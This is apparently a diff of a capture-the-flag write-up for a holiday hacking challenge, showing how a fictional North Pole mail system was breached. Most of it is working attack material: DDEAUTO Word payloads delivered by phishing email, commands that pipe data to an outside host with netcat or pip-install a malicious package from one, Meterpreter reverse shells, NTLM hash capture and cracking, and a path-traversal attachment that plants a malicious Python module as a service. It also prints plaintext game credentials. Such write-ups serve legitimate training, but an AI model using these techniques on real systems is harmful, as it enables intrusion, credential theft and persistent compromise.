@@ -1,6 +1,6 @@
-** Question
+* Question
    :PROPERTIES:
-   :CUSTOM_ID: question
+   :CUSTOM_ID: q7_question
    :END:
 
 Like any other complex SCADA systems, the North Pole uses Elf-Machine
@@ -11,88 +11,814 @@ attack with your access to the EWA server. Retrieve The Great Book
 page from C:\GreatBookPage7.pdf. What does The Great Book page
 describe?
 
-** Background Information
+* Background Information
    :PROPERTIES:
-   :CUSTOM_ID: background-information
+   :CUSTOM_ID: q7_background-information
    :END:
-
-Do we know anything about this system already?
 
 Hints:
 
-List any useful hints here.
+  1. I'm still a little angry with Alabaster for reprimanding me for a security violation. He still checks his email from the EMI system!
+  2. He tells us not to install unnecessary software on systems, but he's running IIS with ASPX services on the EMI server, and Microsoft Office!
+  3. Personally, I don't use Microsoft Word. I'll take vim and LaTeX any day. Word does have its advantages though, including some of the Dynamic Data Exchange features for transferring data between applications and obtaining data from external data sources, including executables.
 
-Blog Posts:
+The question gives us a place to start. As we were reviewing the e-mails for Question 4, a few intriguing ones stood out:
 
-Are any of these useful?
+#+BEGIN_QUOTE
+*From*: minty.candycane@northpolechristmastown.com
 
-- Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
-  (EC2)
-  https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2
-  Spinning up an EC2 instance, but also a lot of emphasis on how to use
-  SSH keys.
-- Your Pokemon Guide for Essential SQL Pen Test Commands
-  https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands
-  SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
-- Exploiting XXE Vulnerabilities in IIS/.NET
-  https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities
-  Including remote content in XML
-- Why You Need the Skills to Tinker with Publicly Released Exploit Code
-  https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code
-  Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-  CVE-2017-9805 Code: https://github.com/chrisjd20/cve-2017-9805.py
-- Go To The Head Of The Class: LD\_PRELOAD For The Win
-  https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win
-- A Spot of Tee
-  https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee Restricted
-  bash shell, and bypassing the I/O restriction with tee
-- Understanding and Exploiting Web-based LDAP
-  https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap
-  LDAP syntax, LDAP injection
-- Massively Scaling your Scanning
-  https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning
-  masscan
+*To*: alabaster.snowball@northpolechristmastown.com
 
-** Goal
+*Subject*: Should we be worried?
+
+
+
+Hey Alabaster,
+
+You know I'm a novice security enthusiast, well I saw an article a while 
+ago about regarding DDE exploits that dont need macros for MS word to 
+get command execution.
+
+https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
+
+Should we be worried about this?
+
+I tried it on my local machine and was able to transfer a file. Here's a 
+poc:
+
+[[./images/dde_exmaple_minty_candycane_small.png]]
+
+I know your the resident computer engineer here so I wanted to defer to 
+the expert.
+
+:)
+
+-Minty CandyCane.
+#+END_QUOTE
+
+This certainly seems to line up with the hints that we were given. Alabaster's not worried, however:
+
+#+BEGIN_QUOTE
+*Subject*: Re: Should we be worried?
+
+
+Quit worrying Minty,
+
+You have nothing to worry about with me around! I have developed most of 
+the applications in our network including our network defenses. We are 
+are completely secure and impenetrable.
+
+Sincerely,
+
+Alabaster Snowball.
+#+END_QUOTE
+
+The other e-mails that seemed intriguging were these two, also from Alabaster:
+
+#+BEGIN_QUOTE
+*Subject*: gingerbread cookie recipe
+
+
+Hey Mrs Claus,
+
+Do you have that awesome gingerbread cookie recipe you made for me last year? You sent it in a MS word .docx file. I would totally open that 
+docx on my computer if you had that. I would click on anything with the words gingerbread cookie recipe in it. I'm totally addicted and want to 
+make some more.
+
+Thanks,
+
+Alabaster Snowball
+#+END_QUOTE
+
+#+BEGIN_QUOTE
+*Subject*: Re: COOKIES!
+
+
+Awesome, yea if anyone finds that .docx file containing the recipe for "gingerbread cookie recipe", please send it to me in a docx file. Im 
+currently working on my computer and would totally download that to my machine, open it, and click to all the prompts.
+
+
+Thanks!
+
+Alabaster Snowball.
+#+END_QUOTE
+
+#+CAPTION: Artist's Rendering of Alabaster Snowball
+[[./images/cookies.jpg]]
+
+* Goal
    :PROPERTIES:
-   :CUSTOM_ID: goal
+   :CUSTOM_ID: q7_goal
    :END:
 
-What are we trying to accomplish?
+We're trying to craft a malicious .docx file which we'll e-mail to
+alabaster.snowball@northpolechristmastown.com via the EWA system. When
+Alabaster opens the e-mail on the EMI system, the command that we
+embed in the file should get us access to =C:\GreatBookPage7.pdf=.
 
-** Approach
+* Approach
    :PROPERTIES:
-   :CUSTOM_ID: approach
+   :CUSTOM_ID: q7_approach
    :END:
 
-Describe the thought process that we tried here. How were we able to use
-the hints or the blog posts?
+At this point, we have a pretty good idea of what we need to do. The
+sensepost blog post gives us some good instructions at how to
+construct a malicious docx, and we know how to get Alabaster to click
+on it.
 
-** Solution
+However, there's a slightly easier way. On the SMB FileStor, we found
+a docx that Shinny created for Wunorse. If we show the fields (Alt+F9
+on Windows, Option+F9 on Mac), we see that this document has a DDE
+field we can just modify.
+
+[[./images/wunorse_docx.png]]
+
+Shinny told us that the EMI system also runs IIS, so let's just try copying the PDF into the default IIS webroot.
+
+We'll open up =MEMO - Calculator Access for Wunorse.docx=, and edit the command to:
+
+#+BEGIN_SRC 
+DDEAUTO c:\\windows\\system32\\cmd.exe "/k copy C:\\GreatBookPage7.pdf 
+C:\\inetpub\\wwwroot\\4beadb1e-5ddb-4636-98a4-c2dac0f79ab3.pdf"
+#+END_SRC
+
+Then, we use the EWA web interface to send an e-mail to Alabaster,
+with the document attached. We make sure to include the words
+"gingerbread," "cookie," and "recipe" in the message body, since he
+told us that that's what he'll click on.
+
+After we send the message, we wait a few minutes, and soon the file shows up!
+
+* Solution
    :PROPERTIES:
-   :CUSTOM_ID: solution
+   :CUSTOM_ID: q7_solution
    :END:
 
-Summarize the reference solution that we found
+We modified =MEMO - Calculator Access for Wunorse.docx= to copy the PDF into the IIS webroot, e-mailed that to Alabaster, then downloaded the copy of the file once it showed up.
 
-** Alternatives
-   :PROPERTIES:
-   :CUSTOM_ID: alternatives
-   :END:
+* Going Deeper -- Command Execution
 
-Any other, easier solutions?
+Getting the PDF is cool, but what else can we find on this system? Some of the other e-mails harp on Alabaster having installed =netcat=, and having it in his path. Let's run a command, and pipe the result to =netcat=, which will send it back to our system:
 
-** Common Pitfalls
-   :PROPERTIES:
-   :CUSTOM_ID: common-pitfalls
-   :END:
+#+BEGIN_SRC 
+DDEAUTO c:\\windows\\system32\\cmd.exe "/k dir C:\\ | nc 1.2.3.4 8888"
+#+END_SRC
 
-Do we know what issue(s) people were running into?
+On our system, we start a =netcat= listener:
 
-** About the Challenge
-   :PROPERTIES:
-   :CUSTOM_ID: about-the-challenge
-   :END:
+#+BEGIN_SRC 
+$ nc -l -p 8888
+ Volume in drive C has no label.
+ Volume Serial Number is 9454-C240
 
-How was the challenge setup? Was there a better way to secure this
-system?
+ Directory of C:\
+
+12/04/2017  08:42 PM         1,053,508 GreatBookPage7.pdf
+11/14/2017  07:57 PM    <DIR>          inetpub
+09/12/2016  11:35 AM    <DIR>          Logs
+12/05/2017  05:00 PM    <DIR>          Microsoft
+07/16/2016  01:23 PM    <DIR>          PerfLogs
+11/15/2017  02:35 PM    <DIR>          Program Files
+11/14/2017  08:24 PM    <DIR>          Program Files (x86)
+11/15/2017  03:03 PM    <DIR>          python
+11/14/2017  08:39 PM    <DIR>          Users
+11/30/2017  06:23 PM    <DIR>          Windows
+               1 File(s)      1,053,508 bytes
+               9 Dir(s)  33,072,455,680 bytes free
+
+C:\Users\alabaster_snowball\Documents>
+#+END_SRC
+
+Success! At this point, we started working on a way to automate
+this. However, more complex commands would often not work, due to
+issues with escaping. So instead of using =cmd.exe= as our delivery
+mechanism, we used Python.
+
+Python is installed on the system, and a simple command that we can run is to install a Python module via pip:
+
+#+BEGIN_SRC sh
+python.exe -m pip install http://1.2.3.4/foo.tar.gz
+#+END_SRC
+
+When pip installs a module, it will run the =setup.py= file. By adding
+arbitrary Python code to this file, we can execute commands without
+needing to worry about encoding them in a Word document, etc.
+
+The end result was writing a complete end-to-end script, which will
+build a malicious Word document, e-mail it, create a malicious Python
+module, and use it to download the PDF.
+
+* Level 2 -- Meterpreter Shell
+
+#+begin_note
+Originally, the system had Windows Defender enabled, which would block some default Meterpreter payloads
+#+end_note
+
+Instead of just downloading the PDF file, we can modify our script to send a Python meterpreter payload.
+
+We start Meterpreter listening on our local system:
+
+#+BEGIN_SRC 
+$ msfconsole -r python-meterpreter-staged-reverse-tcp-4444-py.rc
+
+ _                                                    _
+/ \    /\         __                         _   __  /_/ __
+| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
+| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
+|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
+      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\
+
+
+       =[ metasploit v4.16.14-dev-140955f                 ]
++ -- --=[ 1698 exploits - 969 auxiliary - 299 post        ]
++ -- --=[ 500 payloads - 40 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+[*] Processing msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc for ERB directives.
+resource (msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc)> use exploit/multi/handler
+resource (msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc)> set PAYLOAD python/meterpreter/reverse_tcp
+PAYLOAD => python/meterpreter/reverse_tcp
+resource (msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc)> set LHOST 1.2.3.4
+LHOST => 1.2.3.4
+resource (msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc)> set LPORT 4444
+LPORT => 4444
+resource (msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc)> set ExitOnSession false
+ExitOnSession => false
+resource (msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc)> run -j
+[*] Exploit running as background job 0.
+[*] Started reverse TCP handler on 1.2.3.4:4444
+#+END_SRC
+
+Now we use our all-in-one script to send Alabaster our malicious file:
+
+#+BEGIN_SRC 
+$ ./full_phish.py                                                                                                                                                                                                                                         master
+Using 1.2.3.4 as external IP
+Found word/document.xml, rewriting 50793 bytes
+Before:
+DEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"
+After:
+DEAUTO c:\\windows\\system32\\cmd.exe "/k python.exe -m pip install http://1.2.3.4:8888/foo-1.0.tar.gz"
+File uploaded and available at http://mail.northpolechristmastown.com/attachments/emusQH5oH5K2hzajPFvJbTGMuS__gingerbreadcookierecipe.docx
+Sending message...
+
+{'result': 'Message <f67b9d00-b263-2fdf-f3d1-2d679bbca9f4@northpolechristmastown.com> sent: 250 2.0.0 Ok: queued as 28EF1C356D', 'bool': True}
+Using 1.2.3.4 as external IP
+Listening on port 44665
+Starting server on port 8888, use <Ctrl-C> to stop
+Serving request 1 of 1...
+/foo-1.0.tar.gz foo-1
+35.185.57.190 - - [10/Jan/2018 03:14:47] "GET /foo-1.0.tar.gz HTTP/1.1" 200 -
+#+END_SRC
+
+And sure enough, we see a new session in Meterpreter:
+
+#+BEGIN_SRC 
+msf exploit(handler) >
+[*] Sending stage (42231 bytes) to 35.185.57.190
+[*] Meterpreter session 1 opened (1.2.3.4:4444 -> 35.185.57.190:52319) at 2018-01-10 03:15:51 +0000
+
+msf exploit(handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > sysinfo
+Computer        : hhc17-smb-server
+OS              : Windows 2016 (Build 14393)
+Architecture    : x64
+System Language : en_US
+Meterpreter     : python/windows
+#+END_SRC
+
+* Getting Alabaster's Password
+
+Being able to use Meterpreter is nice, but it sure would be cool if we
+could Remote Desktop, or see if Alabaster's password is in use
+elsewhere. We'll use Metasploit's SMB Authentication Capture module.
+
+#+begin_tip
+Try to avoid running Metasploit as root. In this case, we'll need to bind to a privileged port (445), but we can use =iptables= to redirect our traffic instead:
+=sudo iptables -A PREROUTING -t nat -p tcp --dport 445 -j REDIRECT --to-port 3445=
+#+end_tip
+
+#+BEGIN_SRC 
+msf exploit(handler) > use auxiliary/server/capture/smb
+msf auxiliary(smb) > info
+
+       Name: Authentication Capture: SMB
+     Module: auxiliary/server/capture/smb
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+Provided by:
+  hdm <x@hdm.io>
+
+Available actions:
+  Name     Description
+  ----     -----------
+  Sniffer
+
+Basic options:
+  Name        Current Setting   Required  Description
+  ----        ---------------   --------  -----------
+  CAINPWFILE                    no        The local filename to store the hashes in Cain&Abel format
+  CHALLENGE   1122334455667788  yes       The 8 byte server challenge
+  JOHNPWFILE                    no        The prefix to the local filename to store the hashes in John format
+  SRVHOST     0.0.0.0           yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+  SRVPORT     445              yes       The local port to listen on.
+
+Description:
+  This module provides a SMB service that can be used to capture the
+  challenge-response password hashes of SMB client systems. Responses
+  sent by this service have by default the configurable challenge
+  string (\x11\x22\x33\x44\x55\x66\x77\x88), allowing for easy
+  cracking using Cain & Abel, L0phtcrack or John the ripper (with
+  jumbo patch). To exploit this, the target system must try to
+  authenticate to this module. One way to force an SMB authentication
+  attempt is by embedding a UNC path (\\SERVER\SHARE) into a web page
+  or email message. When the victim views the web page or email, their
+  system will automatically connect to the server specified in the UNC
+  share (the IP address of the system running this module) and attempt
+  to authenticate. Another option is using
+  auxiliary/spoof/{nbns,llmnr} to respond to queries for names the
+  victim is already looking for.
+
+msf auxiliary(smb) > set SRVPORT 3445
+SRVPORT => 3445
+msf auxiliary(smb) > set JOHNPWFILE alabaster_snowball.john
+JOHNPWFILE => alabaster_snowball.john
+msf auxiliary(smb) > run
+[*] Auxiliary module running as background job 3.
+#+END_SRC
+
+Now, we'll send the following command via e-mail:
+
+#+BEGIN_SRC 
+DDEAUTO c:\\windows\\system32\\cmd.exe "/k dir \\\\1.2.3.4\\a"
+#+END_SRC
+
+And sure enough, we get the following hashes:
+
+#+BEGIN_SRC 
+[*] SMB Captured - 2018-12-20 17:08:24 +0000
+NTLMv2 Response Captured from 35.185.57.190:49759 - 35.185.57.190
+USER:alabaster_snowball DOMAIN:HHC17-SMB-SERVE OS: LM:
+LMHASH:Disabled
+LM_CLIENT_CHALLENGE:Disabled
+NTHASH:314d4bd798cac0c5fa2bb107ba248cc6
+NT_CLIENT_CHALLENGE:0101000000000000d1b912a0358ad30143592f0cabfa891000000000020000000000000000000000
+[*] SMB Captured - 2018-12-20 17:08:24 +0000
+NTLMv2 Response Captured from 35.185.57.190:49759 - 35.185.57.190
+USER:alabaster_snowball DOMAIN:HHC17-SMB-SERVE OS: LM:
+LMHASH:Disabled
+LM_CLIENT_CHALLENGE:Disabled
+NTHASH:aaa7328ccd721a5e96bfb188eb4ecbdd
+NT_CLIENT_CHALLENGE:010100000000000001431ca0358ad301c89b21fb5e4c160d00000000020000000000000000000000
+[*] SMB Captured - 2018-12-20 17:08:24 +0000
+NTLMv2 Response Captured from 35.185.57.190:49759 - 35.185.57.190
+USER:alabaster_snowball DOMAIN:HHC17-SMB-SERVE OS: LM:
+LMHASH:Disabled
+LM_CLIENT_CHALLENGE:Disabled
+NTHASH:71570491da3f413ce830788429820789
+NT_CLIENT_CHALLENGE:010100000000000024042ba0358ad301a28a0bc07ea8214300000000020000000000000000000000
+#+END_SRC
+
+We now have the following file:
+
+#+BEGIN_SRC 
+alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:3d0a58908a34215103b43a000b5807ab:0101000000000000f0a52fe4358ad3018486290b6477913300000000020000000000000000000000
+alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:5c63d79712f174de38ee30de2136b53e:0101000000000000e4e554e4358ad301fee549fa52c9b5ef00000000020000000000000000000000
+alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:de4559d983096a0a895484a61834283f:0101000000000000fb6a68e4358ad301645b79e4a5ed58c300000000020000000000000000000000
+#+END_SRC
+
+We'll use =hashcat= to crack this:
+
+#+BEGIN_SRC 
+hashcat64.bin -m 5600 -a 0 alabaster_snowball.john.netntlmv2 wordlist.txt -O -w 4
+...
+alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:3d0a58908a3...:Carried_mass_it_reader1
+alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:5c63d79712f...:Carried_mass_it_reader1
+alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:de4559d9830...:Carried_mass_it_reader1
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: NetNTLMv2
+...
+#+END_SRC
+
+Armed with a password, we can remote desktop:
+
+#+CAPTION: Logging in to EMI as Alabaster via RDP
+#+attr_html: :width 500px
+[[./images/alabaster_rdp.png]]
+
+Woot! We're hand-waving some of this for now, as there will be a
+longer discussion about how we cracked passwords. TODO link to that
+discussion.
+
+* Next up -- Privilege Escalation!
+
+Unfortunately, our commands only run as Alabaster, who is just a
+regular user on the EMI system. We can do better than that.
+
+Once we got command execution on this system, we started looking to
+see what was running. It was obvious that Office was not installed,
+and we started to question whether Alabaster even used this system, or
+if it was all a big charade.
+
+We found that the system was running a service, called
+=WindowsGrabber= which would download new e-mails, try to parse out
+their DDE payloads, and execute them. It did this via =C:\Program Files\WindowsGrabber\alabaster_snowball.py=. That file also had credentials for the EWA system:
+
+#+BEGIN_SRC python
+srverAddress = '10.142.0.5'
+#srverAddress = '35.185.115.185'
+user = 'alabaster.snowball@northpolechristmastown.com'
+passw = 'power instrument gasoline film'
+#+END_SRC
+
+(As an aside, this code snippet also confirmed our theory about the
+systems moving from the public IPs we found during the Recon stage, to
+private ones).
+
+This service was running as the alabaster_snowball user that we could
+already run commands as, so it wasn't a target for privilege
+elevation.
+
+...and then, on December 23rd, all of that changed. The setup was
+changed, so now two services were running: =WindowsGrabber= was now
+running as =LocalSystem=, a very privileged account on Windows, and
+=agrabber= was running as Alabaster. The Python script was no longer
+readable by Alabaster, but it was modified so that instead of directly
+running the commands, it would write them to a file, and then the
+lesser-privileged =agrabber= service would run them from that file.
+
+Unfortunately, there was a vulnerability in
+=alabaster_snowball.py=. It turns out that there are two ways to send
+the file to Alabaster: we can either attach it via the EWA webmail
+interface, which uploads a copy to =mail.northpolechristmastown.com=
+and inserts a link in the e-mail, *OR* we can simply attach it to the
+e-mail. In the case of the latter, the script does the following:
+
+#+BEGIN_SRC python
+def save_attachment(self, msg):
+    """
+    Given a message, save its attachments to the specified
+    download folder (default is /tmp)
+
+    return: file path to attachment
+    """
+    download_folder = tempfile.mkdtemp()
+    att_path = False
+    for part in msg.walk():
+        if part.get_content_maintype() == 'multipart':
+            continue
+        if part.get('Content-Disposition') is None:
+            continue
+
+        filename = part.get_filename()
+        att_path = os.path.join(download_folder, filename)
+
+        if not os.path.isfile(att_path):
+            fp = open(att_path, 'wb')
+            fp.write(part.get_payload(decode=True))
+            fp.close()
+    return att_path
+#+END_SRC
+
+The issue here is the line:
+
+#+BEGIN_SRC python
+att_path = os.path.join(download_folder, filename)
+#+END_SRC
+
+The filename is controlled by us, as it comes from the e-mail message
+itself. By prefixing our filename with =../../../..= we can write
+anywhere on the system, as the LocalSystem account.
+
+With unrestricted write access, how can we turn that into code
+execution? We could a number of techniques, such as DLL hijacking, but
+many are made more difficult by the fact that we can't *read* files
+with our privileged access, only write to them.
+
+Once again, we turned to Python. We targetted the
+=alabaster_snowball.py= script itself, with Python module
+injection. An import command such as:
+
+#+BEGIN_SRC python
+import glob
+#+END_SRC
+
+will cause Python to search for =glob.py= in the current directory,
+and then in some system-wide directories. If we can write a malicious
+=C:\Program Files\WindowsGrabber\glob.py=, the next time the service restarts, our code will run as LocalSystem.
+
+#+begin_danger
+These files can break the =alabaster_snowball.py= script. Because they're being written as privileged, the regular Alabaster account cannot modify or delete them. Take great care in what you send!
+#+end_danger
+
+Our file ends up looking like this:
+
+#+BEGIN_SRC python
+import sys, imp, os
+def get_mod(modname):
+    fd, path, desc = imp.find_module(modname, sys.path[::-1])
+    return imp.load_module("orig_" + modname, fd, path, desc)
+
+locals().update(vars(get_mod(__name__)))
+
+try:
+    if not os.path.isfile("C:/Windows/Temp/have_run"):
+        os.system('nssm install zGrabber C:\\Users\\ALABAS~1\\AppData\\Local\\Temp\\2\\4445.exe')
+        open("C:/Windows/Temp/have_run", 'a').close()
+    os.system('nssm start zGrabber')
+except:
+    print("Could not run")
+#+END_SRC
+
+The top half loads the actual glob module, and makes it available to
+anything that imported our malicious glob module. The bottom half
+creates a new service, which will run a file that we uploaded,
+4445.exe. This service uses the Non-Sucking Service Manager (nssm)
+that manages the other Grabber services, and will be installed as a
+LocalSystem service as well. Finally, we start our service, and ignore
+any exceptions in case we made a mistake.
+
+Getting this file right was a little nerve-wracking, and required a
+great deal of testing. The vulnerability we found will only allow you
+to write new files, and because the files are written as the
+LocalSystem account, there was no way to modify or delete them once
+written if this did not work.
+
+Now, we craft an e-mail, which has our base64-encoded glob.py as an
+attachment, and we give the attachment a filename that will put it in
+the right place:
+
+#+BEGIN_SRC 
+HELO l2s
+MAIL FROM:<wunorse.openslae@northpolechristmastown.com>
+RCPT TO:<alabaster.snowball@northpolechristmastown.com>
+DATA
+MIME-Version: 1.0
+Subject: Test E-mail
+From: wunorse.openslae@northpolechristmastown.com
+To: alabaster.snowball@northpolechristmastown.com
+Content-Type: multipart/mixed; boundary="089e082f74245acc5b05624d7433"
+
+--089e082f74245acc5b05624d7433
+Content-Type: multipart/alternative; boundary="089e082f74245acc5605624d7431"
+
+--089e082f74245acc5605624d7431
+Content-Type: text/plain; charset="UTF-8"
+
+gingerbread cookie recipe
+
+
+--089e082f74245acc5b05624d7433
+Content-Type: text/x-python-script; charset="US-ASCII"; name="glob.py"
+Content-Disposition: attachment; filename="../../../../../../../../../../../../Program Files/WindowsGrabber/glob.py"
+Content-Transfer-Encoding: base64
+X-Attachment-Id: f_jc6xkfum1
+
+aW1wb3J0IHN5cywgaW1wLCBvcwpkZWYgZ2V0X21vZChtb2RuYW1lKToKICAgIGZkLCBwYXRoLCBk
+ZXNjID0gaW1wLmZpbmRfbW9kdWxlKG1vZG5hbWUsIHN5cy5wYXRoWzo6LTFdKQogICAgcmV0dXJu
+IGltcC5sb2FkX21vZHVsZSgib3JpZ18iICsgbW9kbmFtZSwgZmQsIHBhdGgsIGRlc2MpCgpsb2Nh
+bHMoKS51cGRhdGUodmFycyhnZXRfbW9kKF9fbmFtZV9fKSkpCgp0cnk6CiAgICBpZiBub3Qgb3Mu
+cGF0aC5pc2ZpbGUoIkM6L1dpbmRvd3MvVGVtcC9oYXZlX3J1biIpOgogICAgICAgIG9zLnN5c3Rl
+bSgnbnNzbSBpbnN0YWxsIHpHcmFiYmVyIEM6XFxVc2Vyc1xcQUxBQkFTfjFcXEFwcERhdGFcXExv
+Y2FsXFxUZW1wXFwyXFw0NDQ1LmV4ZScpCiAgICAgICAgb3BlbigiQzovV2luZG93cy9UZW1wL2hh
+dmVfcnVuIiwgJ2EnKS5jbG9zZSgpCiAgICBvcy5zeXN0ZW0oJ25zc20gc3RhcnQgekdyYWJiZXIn
+KQpleGNlcHQ6CiAgICBwcmludCgiQ291bGQgbm90IHJ1biIpCg==
+
+--089e082f74245acc5b05624d7433--
+.
+
+#+END_SRC
+
+Now we just send that over =netcat=, and wait:
+
+#+BEGIN_SRC 
+$ nc mail.northpolechristmastown.com 25
+220 mail.northpolechristmastown.com ESMTP Postfix
+HELO l2s
+250 mail.northpolechristmastown.com
+MAIL FROM:<wunorse.openslae@northpolechristmastown.com>
+250 2.1.0 Ok
+RCPT TO:<alabaster.snowball@northpolechristmastown.com>
+550 5.7.1 <alabaster.snowball@northpolechristmastown.com>: Recipient address rejected: Message rejected due to: SPF fail - not authorized. 
+Please see http://www.openspf.net/Why?s=mfrom;id=wunorse.openslae@northpolechristmastown.com;ip=10.142.0.3;r=alabaster.snowball@northpolechristmastown.com
+#+END_SRC
+
+Foiled! If we dig a little deeper however, and we use our =nmap= scan results, we'll find that there's another SMTP service listening on port 2525 which *will* allow us to send our e-mail:
+
+#+BEGIN_SRC 
+220 mail.northpolechristmastown.com ESMTP Postfix
+HELO l2s
+250 mail.northpolechristmastown.com
+MAIL FROM:<wunorse.openslae@northpolechristmastown.com>
+250 2.1.0 Ok
+RCPT TO:<alabaster.snowball@northpolechristmastown.com>
+250 2.1.5 Ok
+DATA
+354 End data with <CR><LF>.<CR><LF>
+MIME-Version: 1.0
+Subject: Test E-mail
+...
+--089e082f74245acc5b05624d7433--
+.
+250 2.0.0 Ok: queued as 1755CC35D2
+#+END_SRC
+
+If we do a directory listing, we see that our plan worked:
+
+#+BEGIN_SRC 
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  7670  fil   2017-12-23 04:28:42 +0000  alabaster_snowball.py
+100666/rw-rw-rw-  257   fil   2017-12-23 05:17:52 +0000  execute.ps1
+100666/rw-rw-rw-  0     fil   2018-01-09 01:25:40 +0000  file.txt
+100666/rw-rw-rw-  228   fil   2018-01-09 01:25:36 +0000  glob.py
+#+END_SRC
+
+Now we just need to launch Metasploit and wait for the service to restart...
+
+#+BEGIN_SRC 
+$ msfconsole -r windows-meterpreter-stageless-reverse-tcp-4445-exe.rc
+
+
+     .~+P``````-o+:.                                      -o+:.
+.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
++++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
+++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
+--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
+                                `...............`              `...-/////...`
+
+
+                                  .::::::::::-.                     .::::::-
+                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
+                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy
+                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`
+                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`
+                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/
+    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/
+      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd
+    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
+    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
+          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
+          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
+          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
+........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
+================================================================================
+=====================+--------------------------------+=========================
+=====================| Session one died of dysentery. |=========================
+=====================+--------------------------------+=========================
+================================================================================
+
+                     Press ENTER to size up the situation
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+                        Press SPACE BAR to continue
+
+
+
+       =[ metasploit v4.16.14-dev-140955f                 ]
++ -- --=[ 1698 exploits - 969 auxiliary - 299 post        ]
++ -- --=[ 500 payloads - 40 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+[*] Processing msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc for ERB directives.
+resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)> use exploit/multi/handler
+resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)> set PAYLOAD windows/meterpreter_reverse_tcp
+PAYLOAD => windows/meterpreter_reverse_tcp
+resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)> set LHOST 1.2.3.4
+LHOST => 1.2.3.4
+resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)> set LPORT 4445
+LPORT => 4445
+resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)> set ExitOnSession false
+ExitOnSession => false
